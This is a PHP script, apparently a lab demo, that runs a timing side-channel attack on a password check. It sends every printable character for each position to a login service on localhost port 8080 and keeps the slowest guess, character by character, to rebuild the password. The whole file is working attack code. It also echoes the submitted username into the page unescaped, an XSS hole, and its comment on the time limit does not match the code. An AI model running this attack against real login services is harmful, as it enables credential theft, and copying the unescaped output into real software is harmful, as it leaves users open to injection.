<?php
set_time_limit(500); // Increase the maximum execution time to 300 seconds

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $server = "127.0.0.1"; // This is the localhost address
    $port = 8080; // The port number the server is listening on
    $username = $_POST['username'];
    $password = $_POST['password'];

    function send_request($server, $port, $username, $password) {
        $socket = fsockopen($server, $port, $errno, $errstr, 30);
        if (!$socket) {
            echo "$errstr ($errno)<br />\n";
            return false;
        }

        fwrite($socket, $username . "\n" . $password);
        $response = fread($socket, 1024);
        fclose($socket);

        return $response;
    }

    $correct_password = "";
    echo "<h1>Timing Attack Test Results</h1>";
    echo "<p>Username: $username</p>";
    echo "<pre>";

    $len = strlen($password);
    for ($i = 0; $i < $len; $i++) {
        $max_time = 0;
        $correct_char = '';
        for ($c = 32; $c < 127; $c++) { // ASCII printable characters
            $test_password = $correct_password . chr($c) . str_repeat('A', $len - strlen($correct_password) - 1);
            
            $start_time = microtime(true);
            $response = send_request($server, $port, $username, $test_password);
            $end_time = microtime(true);

            $time_diff = $end_time - $start_time;
            echo "Character $i: Testing $c (". chr($c) .") took $time_diff seconds\n"; // Print timing information
            if ($time_diff > $max_time) {
                $max_time = $time_diff;
                $correct_char = chr($c);
            }
        }
        $correct_password .= $correct_char;
        echo "Found character: $correct_char\n";
        echo "Current password guess: $correct_password\n";
    }

    // Final check if the discovered password is correct
    $response = send_request($server, $port, $username, $correct_password);
    echo "Discovered password: $correct_password\n";
    if (trim($response) == "CORRECT") {
        echo "The discovered password is correct.\n";
    } else {
        echo "The discovered password is incorrect.\n";
    }
    echo "</pre>";
} else {
    echo "Invalid request method.";
}
?>
